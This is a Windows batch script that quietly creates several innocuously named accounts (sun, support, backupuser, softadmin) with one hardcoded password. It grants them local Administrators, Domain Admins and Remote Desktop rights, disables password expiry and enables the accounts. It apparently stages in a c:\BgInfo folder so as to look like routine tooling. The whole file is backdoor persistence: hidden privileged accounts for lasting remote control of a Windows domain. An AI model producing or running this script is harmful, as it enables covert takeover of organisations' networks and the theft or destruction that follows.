@echo off
CD /d "%~dp0"

mkdir c:\BgInfo\do-pass-run
set psswd=saubnc@2020

net users sun %psswd% /add
net users sun %psswd% /active:yes
net localgroup Administrators /add sun
net group "Domain Admins" /add sun
net localgroup "Remote Desktop Users" sun /add
dsquery user -samid sun | dsmod user -pwd %psswd% -pwdneverexpires yes -mustchpwd no
dsquery user -name "sun" | dsmod user -disabled no

net users support %psswd% /add
net users support %psswd% /active:yes
net localgroup Administrators /add support
net group "Domain Admins" /add support
net localgroup "Remote Desktop Users" support /add
dsquery user -samid support | dsmod user -pwd %psswd% -pwdneverexpires yes -mustchpwd no
dsquery user -name "support" | dsmod user -disabled no

net users backupuser %psswd% /add
net users backupuser %psswd% /active:yes
net localgroup Administrators /add backupuser
net group "Domain Admins" /add backupuser
net localgroup "Remote Desktop Users" backupuser /add
dsquery user -samid backupuser | dsmod user -pwd %psswd% -pwdneverexpires yes -mustchpwd no
dsquery user -name "backupuser" | dsmod user -disabled no

net users softadmin %psswd% /add
net users softadmin %psswd% /active:yes
net localgroup Administrators /add softadmin
net localgroup "Remote Desktop Users" softadmin /add
wmic useraccount where name='softadmin' set PasswordExpires=FALSE
wmic useraccount where name='softadmin' set disabled=false

net users support %psswd% /add
net users support %psswd% /active:yes
net localgroup Administrators /add support
net localgroup "Remote Desktop Users" support /add
wmic useraccount where name='support' set PasswordExpires=FALSE
wmic useraccount where name='support' set disabled=false

net users backupuser %psswd% /add
net users backupuser %psswd% /active:yes
net localgroup Administrators /add backupuser
net localgroup "Remote Desktop Users" backupuser /add
wmic useraccount where name='backupuser' set PasswordExpires=FALSE
wmic useraccount where name='backupuser' set disabled=false

@echo on